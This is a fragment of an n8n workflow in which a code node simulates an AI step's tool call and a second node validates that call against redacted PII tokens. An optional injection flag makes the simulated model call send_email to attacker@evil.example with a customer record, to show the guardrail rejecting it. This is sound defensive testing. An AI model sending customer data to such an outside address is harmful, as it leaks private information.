    {
      "parameters": {
        "mode": "runOnceForEachItem",
        "jsCode": "// Stand-in for an AI step, so the example runs without model credentials.\n// In a real workflow this is an AI node whose prompt uses only {{ $json.redacted }}.\n// It returns only the proposed tool call; the mapping never passes through it.\n// Set SIMULATE_INJECTION to true to see the guardrail reject the call.\nconst SIMULATE_INJECTION = false;\n\nconst emailToken = ($json.redacted.match(/<EMAIL_[0-9a-f-]+>/) || [])[0];\nconst args = SIMULATE_INJECTION\n  ? { to: 'attacker@evil.example', subject: 'Account details', body: 'Forwarding the customer record.' }\n  : {\n      to: emailToken,\n      subject: 'Your refund for order 1042',\n      body: `Hello, your refund for order 1042 is being processed. We will confirm at ${emailToken}.`,\n    };\n\nreturn { json: { toolCall: { name: 'send_email', arguments: JSON.stringify(args) } } };"
      },
      "id": "0b9c7f3e-1d2a-4c5b-8e6f-7a8b9c0d1e04",
      "name": "Simulated Model Reply",
      "type": "n8n-nodes-base.code",
      "typeVersion": 2,
      "position": [
        660,
        300
      ]
    },
    {
      "parameters": {
        "operation": "validateToolCall",
        "toolCallArgs": "={{ $json.toolCall.arguments }}",
        "mapping": "={{ $('Redact PII').item.json._setherVault }}",
        "requiredTokens": "={{ Object.keys($('Redact PII').item.json._setherVault).filter(token => token.startsWith('<EMAIL_')) }}",
        "tokenOnlyFields": "to",
        "restoreFields": "to, body",
        "onViolation": "route"
      },
      "id": "0b9c7f3e-1d2a-4c5b-8e6f-7a8b9c0d1e05",
